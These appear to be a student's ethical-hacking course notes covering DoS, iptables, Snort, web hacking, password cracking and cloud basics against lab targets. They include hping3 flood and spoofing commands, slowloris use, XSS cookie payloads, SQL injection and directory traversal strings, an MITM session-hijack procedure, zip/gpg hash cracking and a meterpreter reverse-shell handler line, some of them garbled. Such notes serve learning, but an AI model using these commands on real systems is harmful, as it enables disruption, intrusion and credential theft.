2025-04-10 10:37

Status:

Tags:

# Denial of Service (DOS)

What is Dos Attack ?
- In a Dos, attackers flood the network with non legitimate service request or traffic to overload its resources.
- Dos in attack on the a computer or network that reduces, restricts or prevents accessibility of system resource to its legitimate user.
- The goal of Dos attack is not to gain unauthorized access to a system or to corrupt data; it is to keep the legitimate users away from using the system.
- Categories of DoS/DDoS attack vectors:
  1. volumetric attacks
  2. protocol attacks
  3. Application layer attack

Types of DoS attacks
- Ping of death - A data packet larger than 65,536 bytes sent to target system to crash it.
	``PING -L 65540 <hostname/IP> ``
- Teardrop - Data is broken down at source into smaller chunks & put back together into larger chunk at destination. Overlapping these fragments can crash  the target machine. 
- Fragmentation attack - Identical data fragments are sent to target machine.
- Smurf attack - Huge number of PING request are sent to the broad cast address of target network.
- SYN flood attack - Exploits  3 way TCP/IP handshake. 

dos/windows/rdp/ms12_020_maxchannelids)

SYN flood attack
auxiliary/dos/tcp/synflood 

sudo hping3 -V -p 80  -S  --flood 10.0.0.209
flood redirect to other 
sudo hping3 -V -p 80  -S  --flood -a 10.0.0.209 10.0.0.153
UDP flood 
``sudo hping3 -V -2  -p <port >-S  --flood <target IP>

``sudo hping3 -V -1    --flood <target IP>

slowloris 
./slowloris.pl -dns <www.ex.com>

./slowloris.pl -dns http://10.10.10.4/

DDoS attack 
LOIC 
HOIC



## 11/04/25
INPUT,  OUPUT chain 
-p Policy 
-A append /Add
-I insert 
-R replace

-p poart 
-s source ip
-d destination ip 
-j jump

sudo 

TO list 
iptables -L 
iptables -L  --line number 
To flush or to remove all the rules 
iptables -F

ACCEPT, REJECT, DROP

iptables -p INPUT, DROP
iptables -p INPUT -p icmp -s 10.10.10.4 -j DROP


sudo iptables -A INPUT -p icmp --icmp-type echo-request -s 10.10.10.5 -j DROP

To replace 
sudo iptables -R INPUT 1 -p icmp --icmp-type echo-request -s 10.10.10.5 -j DROP

sudo iptables -I INPUT -p tcp  -s 10.10.10.5 --dport  22 -j REJECT 

To delet rule 
iptables -D INPUT 1

for appache 
sudo iptables -I INPUT -p tcp  -s 10.10.10.5 --dport  80 -j REJECT/DROP

for disable website 
``sudo iptables -A OUTPUT -p tcp -d <ipof website > --dport 80 -j REJECT
sudo iptables -A OUTPUT -p tcp -d 65.61.137.117 --dport 80 -j REJECT

To Restic the acess of port while doing namo scan from other to host 
- -sT 60 bytes  -sS 44 bytes -sX 40 bytes

sudo iptables -I INPUT  -p tcp -m length --length 60  -j REJECT  --reject-with tcp-reset 

Scanning nmap when all scans are disable 
nmap -Pn -n 10.10.10.4 --data-length 25    

Windows based wirewll 
windows defender firewall by-default allows outbound traffic and does not allows inbound traffic 

How to start ssh service in windows  





IDS

What is Intrusion Detection System ?
- An IDS inspects all inbound and outbound network traffic for suspicious patterns that may indicate a network or system security breach
- The IDS checks traffic for signatures that match known intrusion packet & singnals an alarm when a match is found.
  
**Types of IDS:**
- Network based IDS 
- Host Based IDS
- Log monitoring IDS ( security Information & Event Management)
- Wb Application based IDS 

insatlling snort in ubuntu
sudo apt install snort 

sudo nano /etc/snort/snort.conf 


/etc/snort/rules/

will test the snort configurations 

sudo snort -T -c /etc/snort/snort.conf 

sudo snort -q  -A console -c  /etc/snort/snort.conf  -i enp0s3
fro local 
/etc/snort/rules/local.rules 


What is Honeypot ?
- Is an information system software that is setup to attract and trap people who attempt to penetrate an  organizations network.
- A hooneypot can log port access attempts, monitor an attacker's Keystrokes.




- [ ] 
      
# 14/04/25
Web Hacking 

common status code  for weside  or http cat 
100 - INforamtion 
200 -  Sucess
300 - Redirect
400 -client side rrror 
500 - serverside error

3. Search for Common files 
 - robots.txt
 - himans.txt 
 - sitemap.xml
- View Source code - version, comments, directories 

4 . Check the presence of Web Application Firewall 
-  wafw00f
- --script http-waf-detect 
5. Wb server vulnerability or misconfiguration identification 
- nikto 
	- ``nikto -host <url> 
- CMS Vunlnerability scanner 
	- wpscan 
	- jommscan
	- droopescan


all exploit in which directory 
/usr/share/exploitdb/exploit

for running pythin in kali 
runn usning python 2



prompt for tomcat  using msfconsole 
search tomcat 

# 15/04/25
- OSWAP Top 10
	- OSWAP Web application test 
	- guide - https://github.com/tanprathan/OWASP-Testing-Checklist

White box pen testing and white box pen testing  - 2 to 3 scripting   .net jsp application asp psp 

bug bounty 
Steps for Web application / Bug bounty 
1. read book the Web Application hacker's hand book 
2. Types of attacks in a Web Appliaction https://www.hacksplaining.com/lessons
3. https://portswigger.net/web-security
	- solve VM's 
4. Report writing 
5. Test web application CTF 
- OWASP juice shop (node js ) (web application )
- OWASP Web goat - vulnhub.com - https://www.vulnhub.com/entry/webgoat-1,365/ (javja) (VM)
- vulnweb (web site like)

For bug bounty platform 
- hackerone 
- bugcrowd 
  
### Cross-Site Scripting (XSS) Attack 
- XSS attack takes advantage of dynamically generated we content based on user input provide on web pages.
- An attacker, tries to inject commands input fields provided on web pages.
- If the web server is unable to properly validate  input fields on web page then it will execute the command provided by the attacker and unknowingly reveal information related to client.

- Types of XSS
1. Reflected XSS
2. Stored XSS
3. DOM 
  
  #### Reflected XSS
  - HTML Injection (using meta2)
	- For testing use http://demo.testfire.net/ or Meta2
- using ``<h1> may </h>``
- ``<script>alert("hacker");</script>``
- ``<script>alert(document.cookie);</script>`` 
	- http://10.10.10.6/dvwa/vulnerabilities/xss_r/ name=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E#
 bypassing medium security of web appli
 - using S captial and view using source code 
 - ``<Script>alert(document.cookie);</Script> ``
TO check OSWAP juice shop 
- using XSS cheatsheet 
	- https://github.com/payloadbox/xss-payload-list
		- ```<img src=1 href=1 onerror="javascript:alert(1)"></img>```
- XXS stored 
- insert alert script as admin 
- login as u:pablo p: letmein

  #### DOM

### Command Injection Attacks 
- Command injection vulnerability  in a web application allows attackers to inject untrusted data and execute it as part of regular command or query
- Attacker use specially crafted malicious commands or queries to exploit these vulnerabilities which may result in data loss.
- Injection attacks are passable because of poor web development capabilities 


TO run commands in web appli 
- run in input fildes  that uses 
- using ; and | 
To get  shell using netcat 
-
  
  ### File Inclusion vulnerabilities
  - Local File Inclusion - Allows an attacker to gain access to any file on server computer
  - Attacker xan even access file located apart from web-root folde.
  - Remote File  Inclusion - Allows an attacker to gain access to any file 

###  Directory Traversal 
- Directory Traversal or Path Traversal is an attack on HTTP which allows attacker to access restricted directories outside of the web server root location
- Attacker try to access restriced Directory that contain sensitive information like server configuration files, application source code, etc.
- Attacker can mange to access file loacted outside the web root because of this venerability 
  
- `` http://10.10.10.6/dvwa/vulnerabilities/fi/?page=/../../../../etc/passwd/ ``

To solve HSbox3
nmap port scan 80 open 
dirb web site 
or manually go  /img
- -x .text 
- accesing robot.txt 
- edit etc/host 
- add ipadres of hsbox3
- when ever you see wordpress we use 
	- wpscan  --url  http.

# 16/04/25

## SQL Injection 
SELECT * FROM accounts WHERE username='ben'#' AND passsword=''

``<validusername> 1'or'1'=1``

``<validusername>'#``

``<validusername>'# <something>``

``<validusername>'-- <something>``

OSWAP Swap Scan 

Burp proxy con
1. config
2. 

# Session Hijacking 

Step: 1 login to demo.testfire.net 
	- on kali as jsmith:demo123
	- on ubuntu as admin:password 
Step: 2 Steal or capture from target browser - MITM  + wireshark (man in the middle attack)
using Ettercap 
1. scan  for host 
2. select the target 
	1. set target 1 as router 
	2. set target 2 as main target 
3. to view  cookie as whole  select http stream 

Step: 3 Configure captured cookie values in attacker's  browser


# 17/04/25
cryptography
1. Both sender and receiver will generate their own public and private key pairs 
2. A message encrypted with public key can only be decrypted with equilent private key and wise vice versa 
3. Each party should keep the private key secret 

Ciphers 

Ciphers are algorithms used to encrypt and decrypt the data 

Hash Functions 
- Hash functions calculate a unique fixed-sized bit string representation called a messsage digest of  any arbitrary block of information 
- It is computationally infeasible to have two files with the same message digest ( one-way has) value 
- Example: MD5SHA-1,SHA-256, SHA-512


 md5sum ggg
1668aa0b61ed013b3d0dda3019a8f6e2  ggg


echo -n  ggg | md5sum   
ba248c985ace94863880921d8900c53f 

Salting and trick

hash-identifier 

## cracking cover.zip 
- Cyber chef 
1. base64 -d ss > may
2. unzip may
3. zip2john may  > may2   
4. ecco 
	   - echo 'may:$pkzip$2*1*1*0*8*24*9b83*3c4d0d50768054ca34f55695e8a69daf76085eeb9c337e60e92867059e85550d746d6fa4*2*0*14c*140*4bfad577*5bbb*3e*0*14c*a0e6*6200ede4a3a7fc684444fd7b068115ac9aabe9dc95b26e1902814b0b26c65e5393e3fdf162ec10e2252dfedc95d4464f41805fe2cfeee0084c0c315887726510457f1ab85229157a9b7c5302e778e24099aa60dd682d959b6afeb3bfe59a491c7acaf4f00d588f7a6a8c574b078d572f990c861df660375bb08a0d699be7ae7c0323537d202c95e022d44c1daf901419b282ef054da9cbc23b688b527374cea40ccccea7671678b34bf43b60be612567589cc945f75c583c9487eac4c0ff2f35b5419a99d66c6bf6fc0052a2788880b52025d6ef5b21a4ed40297c64bb7055c119e17b83f752e2db4346af9601b54aff4705e9a5a0440de5da0be417415ecc208aad0332bd9d1afd1617e021c208dc453b541571d562059be74ab267892516b0b44ba036cd986ffd4d5f07cccd52dec8ed20f77511670bf371abf187c993c1b67bb0e06c414d7464a342abff*$/pkzip$::may:keys, Internship_Application.pdf:may' > may_hash.txt
5. john --format=pkzip may_hash.txt
	-  password = shauna           (may)     
6. gpg2john keys > keys.hash
7. john --format=gpg  keys.hash  
	- hacker           
8. gpg --decrypt keys  
	- code
	- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ----- .- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ----- .- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ----- .- ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- ..... ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ----- .- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- ..... ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- ..... ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ...-- --... -.... ---.. ...-- ...-- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ..--- .---- ...-- ..... ...-- --... -.... ---.. ...-- ...-- ----- .- ..... ----- ....- ----- ..--- ....- --... ...-- --... --... ...-- ----- --... ..--- ....- ....- ....- ----. ....- . ....- ...-- ....- ..-. ..... ..--- ..... ..--- ....- ..... ....- ...-- ..... ....- ...-- --... -.... ---.. ...-- ...-- ..--- .---- ...-- .....

9.  put Hexa values in file name pas 
10.  Creating hash for pdf file 
	- pdf2john Internship_Application.pdf > hash.txt 

11. cracking password of pdf using hash 
	 - 7h3P@$sw0rD!5INCORRECT



# 18/04/25 
## WIFI Hacking 

padding

solve VM's
vunlhub DC series 1 to 9 
Mission pumpkin -by sir (cryptography )

# 19/04/25
msfconsole -qx "use  exploit/multi/handler; set payload python/meterpreter/ververse_tcp; set LHOST=10.10.10.4 set PORT= 80

### standard method  cyber kill chain method 
1. Recon
2. Weaponization
3. Delivery 
4. Exploitation 
5. Installation 
6. Commands & control 
7. Actions on objectives 

### MITRE ATT & CK
Framework offers a shared language and structure for describing and understanding adversarial behavior.
- procedure 
	- How the Techniques was carried out. 
	- For exm 
- Techniques 
- Tactics 

Module - 19
# Cloud Computing 
- Cloud computing is an on-demand delivery of IT capabilities where IT infrastructure and applications are provided to subscriber as a metered service over a network.

Characteristics of Cloud computing 
- On demand self services 
- Distributed storage
- Rapid elasticity 
- Automated network 
- Broad network access
- Resource pooling 
- Measured service 
- Virtualization technology 

Cloud Computing Services 
- Infrastructure-as-a-Service (IaaS) 
  
- Platform-as-a-service 
  
- 
  
Cloud Deployment Models 
- private cloud
- Infrastructure 
- 
   
- public cloud 

- Hybrid cloud

- Community cloud 

Cloud Computing Threats 
- Illegal access to the cloud 
- Loss of Business Reputation  due to Co-tenant activities 
- Privilege Escalation
- Hardware Failure 
- VM-Level attacks 
  
BEEF (XSS)
web application runs on port 300


### References
